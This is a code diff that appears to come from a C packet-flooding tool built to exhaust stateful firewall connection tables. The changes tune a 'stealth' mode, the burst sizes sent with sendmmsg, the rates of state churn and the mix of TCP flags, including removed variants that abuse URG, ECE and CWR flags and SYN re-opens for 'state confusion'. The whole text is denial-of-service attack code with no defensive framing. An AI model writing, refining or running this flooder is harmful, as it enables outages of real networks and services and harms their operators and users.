@@ -1784,7 +1784,7 @@ void *worker_thread(void *arg) {
         #define ST_FORCE_EST   2
 
         // Force real 3WHS: FW MUST create state entry for each connection
-        int SYN_MAX_RETRY = stealth ? 1 : 3; // stealth: instant force-establish
+        int SYN_MAX_RETRY = stealth ? 2 : 3; // stealth: faster force-establish
 
         // No ramp — full power from round 1
         #define SOFT_START_ROUNDS 1
@@ -2171,27 +2171,20 @@ void *worker_thread(void *arg) {
                 // Connection recycling — fast for variety but long enough to push Gbps
                 // Dynamic churn rate to exhaust state table
                 if (stealth) {
-                    churn_threshold = 100 + (fast_rand() % 200); // stealth: ultra-fast 100-300 state exhaustion
+                    churn_threshold = 500 + (fast_rand() % 1500); // stealth: aggressive state churn
                 } else {
                     churn_threshold = (args.port == 80 || args.port == 443) ? 
                                                     (1500 + (fast_rand() % 3000)) : (2000 + (fast_rand() % 4000));
                 }
                 
                 if(slot_rn[b] > churn_threshold) {
-                    // Multi-vector teardown for state table exhaustion
-                    unsigned int td = fast_rand() % 100;
-                    if (td < 30) {
+                    // Mix of RST and FIN/ACK for state exhaustion
+                    if (fast_rand() % 2 == 0) {
                         flags = (5<<12)|0x004; // RST
                         th->psh=0; th->ack=0; th->rst=1; th->fin=0; th->syn=0; th->urg=0;
-                    } else if (td < 60) {
+                    } else {
                         flags = (5<<12)|0x011; // FIN+ACK
                         th->psh=0; th->ack=1; th->rst=0; th->fin=1; th->syn=0; th->urg=0;
-                    } else if (td < 80) {
-                        flags = (5<<12)|0x014; // RST+ACK
-                        th->psh=0; th->ack=1; th->rst=1; th->fin=0; th->syn=0; th->urg=0;
-                    } else {
-                        flags = (5<<12)|0x002; // SYN (re-open on same port = state confusion)
-                        th->psh=0; th->ack=0; th->rst=0; th->fin=0; th->syn=1; th->urg=0;
                     }
                     current_pl = 0; // RST/FIN has no payload
                     tw[6] = htons(flags);
@@ -2247,35 +2240,18 @@ void *worker_thread(void *arg) {
                 unsigned int pl_sum_ch = 0;
                 slot_ch_sent[b] = 1;
 
-                // 1. Multi-vector TCP Flags
+                // 1. TCP Flags Randomization (80% ACK, 20% PSH+ACK)
                 unsigned short r_flag = fast_rand() % 100;
-                if(r_flag < 40) {
-                    flags = (5<<12)|0x010; // ACK
+                if(r_flag < 80) {
+                    flags = (5<<12)|0x010; // ACK only
                     th->psh=0; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
-                } else if(r_flag < 65) {
+                } else {
                     flags = (5<<12)|0x018; // PSH+ACK
                     th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
-                } else if(r_flag < 80) {
-                    flags = (5<<12)|0x038; // URG+PSH+ACK (force immediate processing)
-                    th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=1;
-                } else if(r_flag < 90) {
-                    flags = (5<<12)|0x050; // ACK+ECE (congestion abuse)
-                    th->psh=0; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
-                    // ECE bit is in the reserved area, set via flags directly
-                } else {
-                    flags = (5<<12)|0x090; // ACK+CWR (window probe)
-                    th->psh=0; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
                 }
                 
-                    // 2. Multi-payload: alternate PPS/balanced/BPS per round
-                    unsigned int raw_pl;
-                    if (stealth) {
-                        unsigned int pl_mode = round % 5;
-                        if (pl_mode == 0) raw_pl = 256 + (fast_rand() % 256);       // 256-512: PPS burst
-                        else raw_pl = 1000 + (fast_rand() % 440);                   // 1000-1440: BPS (80% of rounds)
-                    } else {
-                        raw_pl = 1000 + (fast_rand() % 440);
-                    }
+                    // 2. Micro-segmentation: Dynamic Payload Size (1000 to 1440)
+                    unsigned int raw_pl = 1000 + (fast_rand() % 440);
                     if(raw_pl & 1) raw_pl++; // Keep even for checksum
                     current_pl = raw_pl;
                     tw[6] = htons(flags);
@@ -2345,7 +2321,7 @@ void *worker_thread(void *arg) {
             // 128x burst, dual socket, skip checksum between bursts
             int cur_fd = fd_send;
             unsigned long long total_sent = 0, total_bytes = 0;
-            int burst_count = stealth ? 768 : 256; // stealth: 3x burst power
+            int burst_count = stealth ? 512 : 256; // stealth: 2x burst power
             for(int burst = 0; burst < burst_count; burst++) {
                 int sent=sendmmsg(cur_fd,vmsg_active,valid_pkts,0);
                 if(sent>0){
